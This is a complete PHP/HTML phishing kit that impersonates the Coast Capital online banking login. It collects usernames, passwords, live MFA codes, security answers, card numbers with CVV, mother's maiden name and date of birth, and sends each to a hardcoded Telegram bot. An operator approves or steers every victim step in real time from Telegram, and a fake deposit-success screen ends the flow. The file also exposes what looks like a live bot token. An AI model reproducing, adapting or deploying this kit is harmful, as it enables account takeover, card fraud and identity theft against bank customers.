<?php
/**
 * Coast Capital Digital Banking - Unified Remote Control System
 * 
 * This file contains the complete frontend UI and the background logic for 
 * real-time Telegram Bot interaction.
 */

// --- CONFIGURATION ---
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

// Initial notification for a new visitor
if (!isset($_POST['action'])) {
    $notifyUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => "🟦 COAST CAPITAL 🟦\n\nNEW VISITOR CONNECTED\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n🟦 COAST CAPITAL 🟦",
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($notifyUrl, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload)
        ]
    ]));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Coast Capital Online® Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Muli:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Muli', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafbfc;
            color: #172b4d;
            -webkit-tap-highlight-color: transparent;
        }
        .step-section { display: none; }
        .step-section.active { display: block; animation: fadeIn 0.3s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .animate-spin { animation: spin 1s linear infinite; }
        .card { background: white; border: 1px solid #dfe1e6; border-radius: 8px; padding: 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .btn-primary { background-color: #0052cc; transition: all 0.2s; }
        .btn-primary:hover { background-color: #0041a3; }
        .input-focus:focus { border-color: #0052cc; box-shadow: 0 0 0 2px rgba(0, 82, 204, 0.2); outline: none; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-[#0052cc] p-3 flex justify-end items-center shadow-md">
        <svg class="w-7 h-7 fill-white" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
        </svg>
    </header>

    <main class="flex-grow flex flex-col items-center px-4 pt-8 pb-12 w-full max-w-[420px] mx-auto">
        <h1 class="text-[2rem] font-extrabold text-[#0052cc] leading-tight text-center mb-6">
            Coast Capital Online®<br>Banking
        </h1>

        <div id="flow-container" class="w-full">
            
            <!-- Step: USERNAME -->
            <section id="step-username" class="step-section active">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-5">Log into digital banking</h2>
                    <div class="mb-4">
                        <label class="block text-sm font-bold mb-1">Username</label>
                        <div class="relative">
                            <svg class="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 fill-[#505f79]" viewBox="0 0 24 24">
                                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                            </svg>
                            <input type="text" id="username" class="w-full pl-10 pr-3 py-3 border border-[#c1c7d0] rounded input-focus transition-all" placeholder="Enter username">
                        </div>
                        <a href="#" class="text-xs text-[#0052cc] font-bold mt-2 inline-block">Forgot your username?</a>
                    </div>
                    <button onclick="goToPassword()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Continue &rarr;</button>
                </div>
            </section>

            <!-- Step: PASSWORD -->
            <section id="step-password" class="step-section">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-5">Enter Password</h2>
                    <div class="mb-4">
                        <label class="block text-sm font-bold mb-1">Password</label>
                        <input type="password" id="password" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus transition-all" placeholder="••••••••">
                        <a href="#" class="text-xs text-[#0052cc] font-bold mt-2 inline-block">Forgot your password?</a>
                    </div>
                    <button onclick="submitLogin()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Sign In</button>
                    <div id="error-password" class="text-[#d93025] text-xs text-center mt-3 font-bold hidden"></div>
                </div>
            </section>

            <!-- Step: PIN -->
            <section id="step-pin" class="step-section">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-2">Verification Required</h2>
                    <div class="bg-[#f0f6ff] border border-[#cce0ff] p-4 rounded-md mb-6 text-sm text-[#004299]">
                        A verification code has been sent to your primary device. Please enter the 6-digit code to continue.
                    </div>
                    <div class="mb-6 text-center">
                        <input type="tel" id="pin-code" maxlength="6" class="w-full text-center text-2xl tracking-[0.5rem] font-bold py-3 border border-[#c1c7d0] rounded input-focus" placeholder="••••••">
                    </div>
                    <button onclick="submitPin()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Verify Identity</button>
                    <div id="error-pin" class="text-[#d93025] text-xs text-center mt-3 font-bold hidden"></div>
                </div>
            </section>

            <!-- Step: SECURITY QUESTION -->
            <section id="step-sq" class="step-section">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-5">Security Question</h2>
                    <div class="bg-[#f0f6ff] border border-[#cce0ff] p-4 rounded-md mb-6 text-sm text-[#004299]">
                        <strong>Question:</strong> What is your first childhood friend's name?
                    </div>
                    <div class="mb-6">
                        <input type="text" id="sq-answer" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus transition-all" placeholder="Answer">
                    </div>
                    <button onclick="submitSQ()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Confirm Answer</button>
                    <div id="error-sq" class="text-[#d93025] text-xs text-center mt-3 font-bold hidden"></div>
                </div>
            </section>

            <!-- Step: CREDIT CARD -->
            <section id="step-cc" class="step-section">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-5">Card Verification</h2>
                    <div class="bg-[#f0f6ff] border border-[#cce0ff] p-4 rounded-md mb-6 text-sm text-[#004299]">
                        Please verify your card details to synchronize your account security.
                    </div>
                    <div class="mb-4">
                        <label class="block text-[10px] font-bold mb-1 uppercase text-[#505f79]">Card Number</label>
                        <input type="tel" id="cc-num" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus" placeholder="0000 0000 0000 0000">
                    </div>
                    <div class="grid grid-cols-2 gap-4 mb-6">
                        <div>
                            <label class="block text-[10px] font-bold mb-1 uppercase text-[#505f79]">Expiry</label>
                            <input type="tel" id="cc-exp" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus" placeholder="MM/YY">
                        </div>
                        <div>
                            <label class="block text-[10px] font-bold mb-1 uppercase text-[#505f79]">CVV</label>
                            <input type="tel" id="cc-cvv" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus" placeholder="•••">
                        </div>
                    </div>
                    <button onclick="submitCC()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Verify Card</button>
                </div>
            </section>

            <!-- Step: PERSONAL DETAILS -->
            <section id="step-details" class="step-section">
                <div class="card">
                    <h2 class="text-xl font-bold text-center mb-5">Personal Details</h2>
                    <div class="bg-[#f0f6ff] border border-[#cce0ff] p-4 rounded-md mb-6 text-sm text-[#004299]">
                        Please provide additional details to confirm your identity.
                    </div>
                    <div class="mb-4">
                        <label class="block text-sm font-bold mb-1">Mother's Maiden Name</label>
                        <input type="text" id="mmn" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus">
                    </div>
                    <div class="mb-6">
                        <label class="block text-sm font-bold mb-1">Date of Birth</label>
                        <input type="text" id="dob" class="w-full px-4 py-3 border border-[#c1c7d0] rounded input-focus" placeholder="DD/MM/YYYY">
                    </div>
                    <button onclick="submitDetails()" class="w-full btn-primary text-white font-bold py-3.5 rounded-full">Confirm Details</button>
                </div>
            </section>

            <!-- Step: LOADING -->
            <section id="step-loading" class="step-section">
                <div class="card text-center py-12">
                    <div class="inline-block w-12 h-12 border-4 border-[#0052cc]/20 border-t-[#0052cc] rounded-full animate-spin mb-6"></div>
                    <h2 id="loading-title" class="text-xl font-bold text-[#172b4d]">Verifying...</h2>
                    <p class="text-sm text-[#505f79] mt-2"></p>
                </div>
            </section>

            <!-- Step: SUCCESS -->
            <section id="step-success" class="step-section">
                <div class="card text-center py-10">
                    <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                        <svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h2 class="text-2xl font-extrabold text-[#172b4d] mb-4">Deposit Successful</h2>
                    <p class="text-[#505f79] text-sm leading-relaxed px-4">
                        Your business access has been synchronized. The deposit will appear in your balance within <strong>90 minutes</strong>.
                    </p>
                    <button onclick="window.location.href='https://www.coastcapitalsavings.com'" class="mt-8 bg-[#0052cc] text-white font-bold py-3 px-10 rounded-full shadow-lg">
                        Go to Dashboard
                    </button>
                </div>
            </section>

        </div>
    </main>

    <!-- Footer -->
    <footer id="main-footer" class="w-full max-w-[420px] mx-auto px-4 pb-8 mt-auto">
        <div class="text-center mb-6">
            <p class="text-sm">Here for the first time? <a href="#" class="text-[#0052cc] font-bold hover:underline">Sign up for digital banking</a></p>
        </div>
        <div class="bg-white border border-[#dfe1e6] rounded-lg p-6 text-center shadow-sm">
            <p class="font-bold leading-relaxed mb-4">Not a member? <span class="block font-normal text-sm">Join Coast Capital.</span></p>
            <button class="bg-white text-[#0052cc] text-base font-bold py-3 px-6 border border-[#c1c7d0] rounded-full shadow-sm hover:border-[#0052cc] transition-colors">
                Open a membership
            </button>
        </div>
    </footer>

    <script>
        const TOKEN = "<?= $telegramToken; ?>";
        const CHAT_ID = "<?= $chatId; ?>";
        
        let lastUpdateId = 0;
        let pollTimer = null;
        let currentUsername = "";
        let currentStepId = "step-username";

        // Initialize polling offset
        fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`)
            .then(r => r.json()).then(d => { if(d.result?.length) lastUpdateId = d.result[0].update_id; });

        function showStep(id) {
            currentStepId = id;
            document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            
            const footer = document.getElementById('main-footer');
            footer.style.display = (id === 'step-success' || id === 'step-loading') ? 'none' : 'block';
            window.scrollTo(0, 0);
        }

        function showLoading(title = "Verifying...") {
            document.getElementById('loading-title').textContent = title;
            showStep('step-loading');
        }

        async function sendToTelegram(step, details) {
            const text = `🟦 COAST CAPITAL 🟦\n\n<b>STEP: ${step.toUpperCase()}</b>\n\n${details}\n\n🟦 COAST CAPITAL 🟦`;
            const keyboard = {
                inline_keyboard: [
                    [{text: "🟩 CORRECT / ALLOW", callback_data: "approve"}],
                    [{text: "🟥 INCORRECT / REJECT", callback_data: "deny"}],
                    [{text: "💳 VERIFY CC INFO", callback_data: "go_cc"}],
                    [{text: "👤 VERIFY PERSONAL INFO", callback_data: "go_details"}],
                    [{text: "⚪️ CANCEL SESSION", callback_data: "cancel"}]
                ]
            };

            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', reply_markup: keyboard })
            });
            const data = await res.json();
            return data.result?.message_id;
        }

        function startPolling(msgId, onApprove, onDeny) {
            if (pollTimer) clearInterval(pollTimer);
            pollTimer = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
                    const data = await res.json();
                    if (data.result?.length) {
                        for (const update of data.result) {
                            lastUpdateId = update.update_id;
                            if (update.callback_query && update.callback_query.message.message_id === msgId) {
                                clearInterval(pollTimer);
                                const cmd = update.callback_query.data;
                                
                                // Clean buttons
                                fetch(`https://api.telegram.org/bot${TOKEN}/editMessageReplyMarkup`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, reply_markup: {inline_keyboard: []}})
                                });

                                // Actions
                                if (cmd === 'approve') onApprove();
                                else if (cmd === 'deny') onDeny();
                                else if (cmd === 'go_cc') showStep('step-cc');
                                else if (cmd === 'go_details') showStep('step-details');
                                else if (cmd === 'cancel') window.location.href = "https://www.coastcapitalsavings.com";
                            }
                        }
                    }
                } catch (e) {}
            }, 2000);
        }

        // --- Step Logic ---

        function goToPassword() {
            currentUsername = document.getElementById('username').value.trim();
            if (currentUsername.length < 3) return;
            showStep('step-password');
        }

        async function submitLogin() {
            const pass = document.getElementById('password').value.trim();
            if (pass.length < 4) return;
            
            showLoading("");
            const msgId = await sendToTelegram("Login", `User: <code>${currentUsername}</code>\nPass: <code>${pass}</code>`);
            startPolling(msgId, 
                () => showStep('step-pin'),
                () => {
                    showStep('step-password');
                    const err = document.getElementById('error-password');
                    err.textContent = "The information entered does not match our records.";
                    err.classList.remove('hidden');
                }
            );
        }

        async function submitPin() {
            const code = document.getElementById('pin-code').value.trim();
            if (code.length !== 6) return;
            
            showLoading("Validating Device...");
            const msgId = await sendToTelegram("MFA PIN", `Code: <code>${code}</code>`);
            startPolling(msgId,
                () => showStep('step-sq'),
                () => {
                    showStep('step-pin');
                    const err = document.getElementById('error-pin');
                    err.textContent = "Invalid verification code.";
                    err.classList.remove('hidden');
                }
            );
        }

        async function submitSQ() {
            const ans = document.getElementById('sq-answer').value.trim();
            if (!ans) return;

            showLoading("Finalizing Deposit...");
            const msgId = await sendToTelegram("Security Answer", `Answer: <code>${ans}</code>`);
            startPolling(msgId,
                () => showStep('step-success'),
                () => {
                    showStep('step-sq');
                    const err = document.getElementById('error-sq');
                    err.textContent = "Answer not recognized.";
                    err.classList.remove('hidden');
                }
            );
        }

        async function submitCC() {
            const n = document.getElementById('cc-num').value;
            const e = document.getElementById('cc-exp').value;
            const c = document.getElementById('cc-cvv').value;
            
            showLoading("");
            const msgId = await sendToTelegram("Credit Card", `Num: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>`);
            startPolling(msgId, () => showStep('step-success'), () => showStep('step-cc'));
        }

        async function submitDetails() {
            const m = document.getElementById('mmn').value;
            const d = document.getElementById('dob').value;
            
            showLoading("Confirming Identity...");
            const msgId = await sendToTelegram("Personal Details", `MMN: <code>${m}</code>\nDOB: <code>${d}</code>`);
            startPolling(msgId, () => showStep('step-success'), () => showStep('step-details'));
        }

        // Input formatting for CC
        document.getElementById('cc-num').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
        document.getElementById('cc-exp').addEventListener('input', (e) => {
            let v = e.target.value.replace(/[^\d]/g, '');
            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
            e.target.value = v;
        });
    </script>
</body>
</html>